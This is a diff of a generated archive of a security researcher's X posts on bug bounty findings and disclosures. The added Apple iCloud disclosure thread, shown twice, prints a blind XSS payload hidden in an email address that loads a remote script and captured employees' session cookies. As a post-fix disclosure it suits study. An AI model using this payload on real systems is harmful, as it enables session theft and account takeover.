@@ -1,11 +1,27 @@
 # @samwcyo — full verbatim X archive (security-relevant posts)
 
-_Generated 2026-11-24 from the X API (full-archive search + timeline). Every post below is copied word-for-word; t.co links are expanded; quoted posts are inlined in full; media are listed with alt text when the author provided it. Posts are grouped by conversation (a thread = the author's root post followed by their own replies, oldest first). Groups are newest first. An agent without X access can rely on this file._
+_Generated 2026-11-25 from the X API (full-archive search + timeline). Every post below is copied word-for-word; t.co links are expanded; quoted posts are inlined in full; media are listed with alt text when the author provided it. Posts are grouped by conversation (a thread = the author's root post followed by their own replies, oldest first). Groups are newest first. An agent without X access can rely on this file._
 
-- Posts in this file: 205
-- Conversations/threads: 189
+- Posts in this file: 208
+- Conversations/threads: 192
 - Oldest post captured: 2017-02-12
-- Newest post captured: 2026-11-20
+- Newest post captured: 2026-11-24
+
+
+---
+
+## 2026-11-24 · Post · GTA VI almost working [pic.x.com/mp261CEDaB]
+
+
+### Post — @samwcyo — 2026-11-24 23:36 UTC (2026-11-25 00:36 WAT)
+
+- URL: https://x.com/samwcyo/status/2125373094961242580
+- Metrics (at fetch): not returned
+
+> GTA VI almost working [pic.x.com/mp261CEDaB]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HX7XXKVXYAAI-VE.jpg — no alt text provided by author
 
 
 ---
@@ -555,7 +571,7 @@ Tags (automatic): Path normalization
 ### Post — @samwcyo — 2024-10-21 02:57 UTC (2024-10-21 03:57 WAT)
 
 - URL: https://x.com/samwcyo/status/1848196974006186384
-- Metrics (at fetch): bookmark 184, impression 70074, like 549, quote 9, reply 23, retweet 42
+- Metrics (at fetch): bookmark 184, impression 70082, like 550, quote 9, reply 23, retweet 42
 
 > After a really long time only focused on manual web security stuff, almost everything has started to feel like a QA checklist. There are definitely people doing novel research and dropping crazy bugs, but I think a lot of the big stepping stones require people to build really
 
@@ -568,7 +584,7 @@ Tags (automatic): Path normalization
 ### Post — @samwcyo — 2024-09-26 13:32 UTC (2024-09-26 14:32 WAT)
 
 - URL: https://x.com/samwcyo/status/1839297112066109671
-- Metrics (at fetch): bookmark 1243, impression 345162, like 3502, quote 132, reply 84, retweet 955
+- Metrics (at fetch): bookmark 1243, impression 345180, like 3503, quote 132, reply 84, retweet 955
 
 > New writeup from @_specters_ and I: we're finally allowed to disclose a vulnerability reported to Kia which would've allowed an attacker to remotely control almost all vehicles made after 2013 using only the license plate.
 >
@@ -587,7 +603,7 @@ Tags (automatic): Path normalization
 ### Post — @samwcyo — 2024-06-03 05:27 UTC (2024-06-03 06:27 WAT)
 
 - URL: https://x.com/samwcyo/status/1797500342814507070
-- Metrics (at fetch): bookmark 428, impression 126573, like 1199, quote 30, reply 45, retweet 373
+- Metrics (at fetch): bookmark 428, impression 126576, like 1200, quote 30, reply 45, retweet 373
 
 > New writeup:
 >
@@ -640,11 +656,38 @@ Tags (automatic): Path normalization
 ### Post — @samwcyo — 2024-05-31 23:21 UTC (2024-06-01 00:21 WAT)
 
 - URL: https://x.com/samwcyo/status/1796683500210278834
-- Metrics (at fetch): bookmark 10, impression 16328, like 62, quote 0, reply 8, retweet 2
+- Metrics (at fetch): bookmark 10, impression 16332, like 62, quote 0, reply 8, retweet 2
 
 > Many people I know are reporting publicly disclosed credentials (that were all posted to public Telegram channels) to bug bounty programs, but there really doesn't seem to be any standards for how programs should handle these submissions.
 >
 > I think that paying for credentials is
+
+
+---
+
+## 2024-03-21 · Post · Really excited to see this finally disclosed. The existence of this vulnerability has taken nearly t
+
+
+### Post — @samwcyo — 2024-03-21 14:29 UTC (2024-03-21 15:29 WAT)
+
+- URL: https://x.com/samwcyo/status/1770820016255943032
+- Metrics (at fetch): not returned
+
+> Really excited to see this finally disclosed. The existence of this vulnerability has taken nearly two years to be released as each of the over 3 million individual locks in 131 countries have to be physically maintenanced, one at a time, through either being replaced or updated. https://twitter.com/LennertWo/status/1770814332856668279
+
+**Links in post:** https://twitter.com/LennertWo/status/1770814332856668279
+
+**Quoted post (full text):**
+
+    #### Quoted post — @322560263 — 2024-03-21 14:06 UTC (2024-03-21 15:06 WAT)
+    
+    - URL: https://x.com/322560263/status/1770814332856668279
+    - Metrics (at fetch): not returned
+    
+    > In 2022 we found vulnerabilities in dormakaba Saflok hotel locks. Reading one RFID card enables us to forge a pair of cards that open any door in that hotel! Dormakaba is currently working with its customers to fix the 3 million affected locks. https://www.wired.com/story/saflok-hotel-lock-unsaflok-hack-technique/
+    
+    **Links in post:** https://www.wired.com/story/saflok-hotel-lock-unsaflok-hack-technique/
+    
 
 
 ---
@@ -690,7 +733,9 @@ Tags (automatic): Blockchain / L1-L2 / bridge
 - URL: https://x.com/samwcyo/status/1752123362128838752
 - Metrics (at fetch): bookmark 3, impression 10317, like 25, quote 0, reply 2, retweet 1
 
-> Faking a security audit is definitely interesting. I wonder if it'd be worth it to build some audit validator service. Has this publicly happened in the past before? https://t.co/yeR8GW6dUW
+> Faking a security audit is definitely interesting. I wonder if it'd be worth it to build some audit validator service. Has this publicly happened in the past before? https://twitter.com/trailofbits/status/1752109824282910869
+
+**Links in post:** https://twitter.com/trailofbits/status/1752109824282910869
 
 **Quoted post (full text):**
 
@@ -722,9 +767,11 @@ Tags (automatic): XSS
 - Metrics (at fetch): bookmark 200, impression 36009, like 437, quote 1, reply 8, retweet 114
 
 > “Rook to XSS: How I hacked chess[.]com with a rookie exploit”
-> https://t.co/Gnur3tc8M5
+> https://skii.dev/rook-to-xss/
 >
-> Really great read! If you’ve never looked, https://t.co/G45QH58TNi has a great off-platform bug bounty program via security@chess.com
+> Really great read! If you’ve never looked, http://chess.com has a great off-platform bug bounty program via security@chess.com
+
+**Links in post:** https://skii.dev/rook-to-xss/, http://chess.com
 
 
 ---
@@ -732,18 +779,51 @@ Tags (automatic): XSS
 ## 2023-12-24 · Post · This tweet reminded me of a time when I was hacking on Apple's bug bounty program. I found, of all t
 
 
+Tags (automatic): XSS, Request smuggling / desync
+
+
 ### Post — @samwcyo — 2023-12-24 18:34 UTC (2023-12-24 19:34 WAT)
 
 - URL: https://x.com/samwcyo/status/1738991457627717913
 - Metrics (at fetch): bookmark 493, impression 202716, like 1348, quote 9, reply 25, retweet 229
 
-> This tweet reminded me of a time when I was hacking on Apple's bug bounty program. I found, of all things, a base64 encoded Harry Potter quote on an internal iCloud account debug and administration page. This is the first time I'm sharing this, as more than 90 days have passed https://t.co/BNauDq7w01 https://t.co/CBc8QC5y3i
+> This tweet reminded me of a time when I was hacking on Apple's bug bounty program. I found, of all things, a base64 encoded Harry Potter quote on an internal iCloud account debug and administration page. This is the first time I'm sharing this, as more than 90 days have passed since the vulnerability was fixed.
+>
+> When Apple introduced iCloud+, they added a feature where you could add custom email domains to your account as secondary emails. As with all web hacking attempts, I tried sneaking in a blind XSS payload in my custom email that would pass the (sometimes hard to get right) email RegEx.
+> After a while, I found a trick! I was able to add a secondary email with a smuggled blind XSS payload to my Apple account with the following payload:
+>
+> sam+'></script><script/src=//domain/payload.js>'@[mydomain].com
+>
+> By wrapping the script tag around single quotes, it entered a different parsing region and allowed me to register an email address with a blind XSS payload. This account was special, because it became an official Apple ID that could be used to authenticate to all Apple services and used with the "Sign in with Apple" SSO service.
+>
+> After registering the malicious email, I authenticated to as many Apple systems as possible in an attempt to cast a wide net searching for blind XSS vulnerabilities. None of the Apple systems were expecting such an odd email address, so I caused hundreds of client-side and server-side errors which were all being reported back to Apple developers.
+>
+> One of these developers began personally investigating the issue. Why was this user running into so many errors? Why does their email address look so weird?
+>
+> They pulled up my iCloud account on multiple internal Apple systems, triggering my payload on multiple authenticated portals where a malicious attacker could've exfiltrated account information for any other Apple ID. Every time the payload was triggered, I would receive a copy of the employee's page they were viewing, their session cookies, and information about their web browser.
+>
+> After a while, I received a super interesting alert! Someone had triggered my payload from an internal Apple system that looked to be used to as an account management endpoint via the following URL:
+>
+> [internal].apple.com/accountservice/[id]/show/memQuery
+> The screenshot of the system sent back was super interesting. It appeared to be a very old Apple ID maintenance and administration page which let Apple employees deprovision and modify Apple ID accounts.
+>
+> Near the bottom of the page was a very odd string. It looked to be a JavaScript comment accidentally written in the HTML of the page with a base64 encoded string and the name of someone named Josy. How weird?
+> I went to decode the string and received the following back:
+>
+> cc0un+R1ddle~~If you have to ask, you'll never know. If you know, you need only ask.
+>
+> How cryptic! I Googled it, and found this:
+> For a company like Apple who is so particular about branding, it felt very rewarding to have discovered a bit of an easter egg that an employee probably hid away some number of years ago for fun. Had this vulnerability not been discovered, an attacker could've abused this to access and modify anyone's Apple account.
+>
+> After reporting this vulnerability, Apple paid me a reward through their bug bounty program and promptly fixed the email injection vulnerability. Thanks for reading and happy holidays!
 
 **Media:**
 - photo: https://pbs.twimg.com/media/GCIZnZzWMAAeg8K.jpg — no alt text provided by author
 - photo: https://pbs.twimg.com/media/GCIenfGWsAA_RVm.png — no alt text provided by author
 - photo: https://pbs.twimg.com/media/GCIhdj9W4AEpWJ0.png — no alt text provided by author
 - photo: https://pbs.twimg.com/media/GCIhuaCWAAAhZm0.jpg — no alt text provided by author
+
+**Links in post:** https://twitter.com/fileintegrity/status/1738526619940118841
 
 **Quoted post** 1738526619940118841: not readable via the API (deleted, private, or withheld).
 
@@ -753,18 +833,55 @@ Tags (automatic): XSS
 ## 2023-12-24 · Post · This tweet reminded me of a time when I was hacking on Apple's bug bounty program. I found, of all t
 
 
+Tags (automatic): XSS, Request smuggling / desync
+
+
 ### Post — @samwcyo — 2023-12-24 18:33 UTC (2023-12-24 19:33 WAT)
 
 - URL: https://x.com/samwcyo/status/1738991258888999265
 - Metrics (at fetch): bookmark 1, impression 9398, like 0, quote 1, reply 0, retweet 0
 
-> This tweet reminded me of a time when I was hacking on Apple's bug bounty program. I found, of all things, a base64 encoded Harry Potter quote on an internal iCloud account debug and administration page. This is the first time I'm sharing this, as more than 90 days have passed https://t.co/3hHNvVJfxN https://t.co/CBc8QC5y3i
+> This tweet reminded me of a time when I was hacking on Apple's bug bounty program. I found, of all things, a base64 encoded Harry Potter quote on an internal iCloud account debug and administration page. This is the first time I'm sharing this, as more than 90 days have passed since the vulnerability was fixed.
+>
+> When Apple introduced iCloud+, they added a feature where you could add custom email domains to your account as secondary emails. As with all web hacking attempts, I tried sneaking in a blind XSS payload in my custom email that would pass the (sometimes hard to get right) email RegEx.
+>
+> After a while, I found a trick! I was able to add a secondary email with a smuggled blind XSS payload to my Apple account with the following payload:
+>
+> sam+'></script><script/src=//domain/payload.js>'@[mydomain].com
+>
+> By wrapping the script tag around single quotes, it entered a different parsing region and allowed me to register an email address with a blind XSS payload. This account was special, because it became an official Apple ID that could be used to authenticate to all Apple services and used with the "Sign in with Apple" SSO service.
+>
+> After registering the malicious email, I authenticated to as many Apple systems as possible in an attempt to cast a wide net searching for blind XSS vulnerabilities. None of the Apple systems were expecting such an odd email address, so I caused hundreds of client-side and server-side errors which were all being reported back to Apple developers.
+>
+> One of these developers began personally investigating the issue. Why was this user running into so many errors? Why does their email address look so weird?
+>
+> They pulled up my iCloud account on multiple internal Apple systems, triggering my payload on multiple authenticated portals where a malicious attacker could've exfiltrated account information for any other Apple ID. Every time the payload was triggered, I would receive a copy of the employee's page they were viewing, their session cookies, and information about their web browser.
+>
+> After a while, I received a super interesting alert! Someone had triggered my payload from an internal Apple system that looked to be used to as an account management endpoint via the following URL:
+>
+> [internal].apple.com/accountservice/[id]/show/memQuery
+>
+> The screenshot of the system sent back was super interesting. It appeared to be a very old Apple ID maintenance and administration page which let Apple employees deprovision and modify Apple ID accounts.
+>
+> Near the bottom of the page was a very odd string. It looked to be a JavaScript comment accidentally written in the HTML of the page with a base64 encoded string and the name of someone named Josy. How weird?
+>
+> I went to decode the string and received the following back:
+>
+> cc0un+R1ddle~~If you have to ask, you'll never know. If you know, you need only ask.
+>
+> How cryptic! I Googled it, and found this:
+>
+> For a company like Apple who is so particular about branding, it felt very rewarding to have discovered a bit of an easter egg that an employee probably hid away some number of years ago for fun. Had this vulnerability not been discovered, an attacker could've abused this to access and modify anyone's Apple account.
+>
+> After reporting this vulnerability, Apple paid me a reward through their bug bounty program and promptly fixed the email injection vulnerability. Thanks for reading and happy holidays!
 
 **Media:**
 - photo: https://pbs.twimg.com/media/GCIZnZzWMAAeg8K.jpg — no alt text provided by author
 - photo: https://pbs.twimg.com/media/GCIenfGWsAA_RVm.png — no alt text provided by author
 - photo: https://pbs.twimg.com/media/GCIhdj9W4AEpWJ0.png — no alt text provided by author
 - photo: https://pbs.twimg.com/media/GCIhuaCWAAAhZm0.jpg — no alt text provided by author
+
+**Links in post:** https://twitter.com/fileintegrity/status/1738526619940118841
 
 **Quoted post** 1738526619940118841: not readable via the API (deleted, private, or withheld).
 
@@ -832,6 +949,38 @@ Tags (automatic): Platform: HackerOne, Platform: Bugcrowd
 
 ---
 
+## 2023-08-29 · Post · “As I roam the city in my car, nearby players are attempting to play the music from the URL being br
+
+
+### Post — @samwcyo — 2023-08-29 18:46 UTC (2023-08-29 19:46 WAT)
+
+- URL: https://x.com/samwcyo/status/1696595210698973430
+- Metrics (at fetch): not returned
+
+> “As I roam the city in my car, nearby players are attempting to play the music from the URL being broadcasted by my car. Since this "URL" is a maliciously crafted payload, they are instead connecting to my websocket awaiting further command.” https://twitter.com/nullpt_rs/status/1696591279071637956
+
+**Links in post:** https://twitter.com/nullpt_rs/status/1696591279071637956
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1321459788350431233 — 2023-08-29 18:30 UTC (2023-08-29 19:30 WAT)
+    
+    - URL: https://x.com/1321459788350431233/status/1696591279071637956
+    - Metrics (at fetch): not returned
+    
+    > Hacking GTA V RP Servers Using Web Exploitation Techniques by @blastbots 
+    >
+    > https://www.nullpt.rs/hacking-gta-servers-using-web-exploitation [pic.x.com/wFxUzpbUi3]
+    
+    **Media:**
+    - media `3_1696591260901924864` (details not returned by the API)
+    
+    **Links in post:** https://www.nullpt.rs/hacking-gta-servers-using-web-exploitation
+    
+
+
+---
+
 ## 2023-08-24 · Post · If crypto has been great for one thing, it would be inspiring people to come up with interesting att
 
 
@@ -871,7 +1020,7 @@ Tags (automatic): Platform: HackerOne, Platform: Bugcrowd
 ### Post — @samwcyo — 2023-08-03 17:59 UTC (2023-08-03 18:59 WAT)
 
 - URL: https://x.com/samwcyo/status/1687161209202622487
-- Metrics (at fetch): not returned
+- Metrics (at fetch): bookmark 199, impression 62631, like 653, quote 8, reply 24, retweet 249
 
 > New writeup:
 >
@@ -894,7 +1043,7 @@ Tags (automatic): Platform: HackerOne, Platform: Bugcrowd
 ### Post — @samwcyo — 2023-08-03 17:37 UTC (2023-08-03 18:37 WAT)
 
 - URL: https://x.com/samwcyo/status/1687155832868278273
-- Metrics (at fetch): not returned
+- Metrics (at fetch): bookmark 10, impression 15586, like 61, quote 2, reply 5, retweet 16
 
 > New writeup:
 >
@@ -917,7 +1066,7 @@ Tags (automatic): Platform: HackerOne, Platform: Bugcrowd
 ### Post — @samwcyo — 2023-08-03 17:35 UTC (2023-08-03 18:35 WAT)
 
 - URL: https://x.com/samwcyo/status/1687155318831136769
-- Metrics (at fetch): not returned
+- Metrics (at fetch): bookmark 0, impression 2412, like 4, quote 1, reply 1, retweet 1
 
 > New writeup!
 >
@@ -940,7 +1089,7 @@ Tags (automatic): Platform: HackerOne, Platform: Bugcrowd
 ### Post — @samwcyo — 2023-08-03 17:34 UTC (2023-08-03 18:34 WAT)
 
 - URL: https://x.com/samwcyo/status/1687155045677080576
-- Metrics (at fetch): not returned
+- Metrics (at fetch): bookmark 0, impression 306, like 1, quote 0, reply 0, retweet 0
 
 > New writeup!
 >
@@ -963,7 +1112,7 @@ Tags (automatic): Platform: HackerOne, Platform: Bugcrowd
 ### Post — @samwcyo — 2023-07-27 05:45 UTC (2023-07-27 06:45 WAT)
 
 - URL: https://x.com/samwcyo/status/1684439754849259521
-- Metrics (at fetch): not returned
+- Metrics (at fetch): bookmark 9, impression 20601, like 73, quote 1, reply 1, retweet 9
 
 > Instead of getting banned from Akamai, bug bounty hunters are going to get their hardware integrity scores nuked to the point they can’t register or post anywhere. If this gets wide scale implementation the internet is going to be a very different place for everyone. https://twitter.com/gf_256/status/1683875257881436164
 
@@ -974,7 +1123,7 @@ Tags (automatic): Platform: HackerOne, Platform: Bugcrowd
     #### Quoted post — @1126385176467124224 — 2023-07-25 16:22 UTC (2023-07-25 17:22 WAT)
     
     - URL: https://x.com/1126385176467124224/status/1683875257881436164
-    - Metrics (at fetch): not returned
+    - Metrics (at fetch): bookmark 8, impression 26934, like 29, quote 1, reply 2, retweet 5
     
     > yea its already here lol https://httptoolkit.com/blog/apple-private-access-tokens-attestation/
     
@@ -1003,7 +1152,7 @@ Tags (automatic): Platform: HackerOne, Platform: Bugcrowd
 ### Post — @samwcyo — 2022-11-08 05:53 UTC (2022-11-08 06:53 WAT)
 
 - URL: https://x.com/samwcyo/status/1589858684427210752
-- Metrics (at fetch): not returned
+- Metrics (at fetch): bookmark 150, impression 0, like 1280, quote 12, reply 33, retweet 182
 
 > Between July 7th to July 17th, 2022, we formed a small team of hackers and collectively hunted for vulnerabilities on John Deere’s security program.
 >
@@ -1021,7 +1170,7 @@ Tags (automatic): XSS
 ### Post — @samwcyo — 2022-09-21 23:41 UTC (2022-09-22 00:41 WAT)
 
 - URL: https://x.com/samwcyo/status/1572732708261724160
-- Metrics (at fetch): not returned
+- Metrics (at fetch): bookmark 165, impression 0, like 530, quote 2, reply 10, retweet 182
 
 > New blog post detailing some findings from auditing the Next.js ecosystem:
 >
@@ -1045,7 +1194,7 @@ Tags (automatic): Platform: HackerOne
 ### Post — @samwcyo — 2022-09-16 00:58 UTC (2022-09-16 01:58 WAT)
 
 - URL: https://x.com/samwcyo/status/1570577801790783493
-- Metrics (at fetch): not returned
+- Metrics (at fetch): bookmark 274, impression 0, like 3588, quote 229, reply 71, retweet 921
 
 > Someone hacked an Uber employees HackerOne account and is commenting on all of the tickets. They likely have access to all of the Uber HackerOne reports. [pic.x.com/00j8V3kcoE]
 
@@ -1061,7 +1210,7 @@ Tags (automatic): Platform: HackerOne
 ### Post — @samwcyo — 2022-08-26 03:46 UTC (2022-08-26 04:46 WAT)
 
 - URL: https://x.com/samwcyo/status/1563009993980358656
-- Metrics (at fetch): not returned
+- Metrics (at fetch): bookmark 13, impression 0, like 324, quote 0, reply 9, retweet 11
 
 > Been working on some neat stuff which we can hopefully release soon:
 >
@@ -1079,7 +1228,7 @@ Tags (automatic): Platform: HackerOne
 ### Post — @samwcyo — 2022-08-14 20:45 UTC (2022-08-14 21:45 WAT)
 
 - URL: https://x.com/samwcyo/status/1558917694522413056
-- Metrics (at fetch): not returned
+- Metrics (at fetch): bookmark 15, impression 0, like 107, quote 0, reply 2, retweet 9
 
 > Super super impressed by the research from @erbbysam and @Rhynorater in their talk "Crossing the KASM - a webapp pentest story". Captured the entire essence of bug hunting and detailed a really neat niche issue affecting a complicated implementation. Great takeaways for hunters.
 
@@ -1095,7 +1244,7 @@ Tags (automatic): Platform: HackerOne
 ### Post — @samwcyo — 2022-08-06 06:21 UTC (2022-08-06 07:21 WAT)
 
 - URL: https://x.com/samwcyo/status/1555801091131904000
-- Metrics (at fetch): not returned
+- Metrics (at fetch): bookmark 1, impression 0, like 157, quote 0, reply 18, retweet 8
 
 > Super happy to be added to the HackerOne elite hall of fame! Huge congrats to @Rhynorater @codecancare  @lean0x2f @Regala_ for placing! So many great friends and memories made over the last 7 years of bug bounty :) https://twitter.com/hacker0x01/status/1555753405401812993
 
@@ -1106,7 +1255,7 @@ Tags (automatic): Platform: HackerOne
     #### Quoted post — @Hacker0x01 — 2022-08-06 03:11 UTC (2022-08-06 04:11 WAT)
     
     - URL: https://x.com/Hacker0x01/status/1555753405401812993
-    - Metrics (at fetch): not returned
+    - Metrics (at fetch): bookmark 1, impression 0, like 69, quote 2, reply 2, retweet 1
     
     > Hacking big tech, web3 companies, and sharing amazing write-ups. @samwcyo is constantly pushing limits &amp; submitting amazing finds. Congrats boy wonder for being added to the #H1Elite hall of fame! [pic.x.com/NBOAqpDrVD]
     
@@ -1123,7 +1272,7 @@ Tags (automatic): Platform: HackerOne
 ### Post — @samwcyo — 2022-06-29 00:26 UTC (2022-06-29 01:26 WAT)
 
 - URL: https://x.com/samwcyo/status/1541941143264542722
-- Metrics (at fetch): not returned
+- Metrics (at fetch): bookmark 6, impression 0, like 288, quote 4, reply 18, retweet 14
 
 > Haven't done much bug bounty in the last few months but finally had the chance to look today and found a vulnerability today which allowed me to control a companies telepresence robots. WASD to navigate, could speak to the employees and see what they're up to via my desktop mic! [pic.x.com/YJJXVTEpJ8]
 
@@ -1140,7 +1289,7 @@ Tags (automatic): Platform: HackerOne
 ### Post — @samwcyo — 2022-05-31 18:24 UTC (2022-05-31 19:24 WAT)
 
 - URL: https://x.com/samwcyo/status/1531703234557091842
-- Metrics (at fetch): not returned
+- Metrics (at fetch): bookmark 5, impression 0, like 37, quote 0, reply 3, retweet 3
 
 > Really great topic from @lorenzofb with work from @joshfraser and @gf_256, the Discord bot ecosystem really isn’t where it needs to be in terms of security. We’ve put a lot of time into this and found a number of critical issues with then most popular bots. https://twitter.com/gf_256/status/1531700881963552771
 
@@ -1151,7 +1300,7 @@ Tags (automatic): Platform: HackerOne
     #### Quoted post — @1126385176467124224 — 2022-05-31 18:15 UTC (2022-05-31 19:15 WAT)
     
     - URL: https://x.com/1126385176467124224/status/1531700881963552771
-    - Metrics (at fetch): not returned
+    - Metrics (at fetch): bookmark 18, impression 0, like 129, quote 1, reply 6, retweet 16
     
     > Vice Motherboard interviewed me! I got to poop on Discord bots for being a security hazard, hooray😊 https://www.vice.com/en/article/n7n848/discord-is-the-worlds-most-important-financial-messenger-and-a-hotbed-for-scammers
     
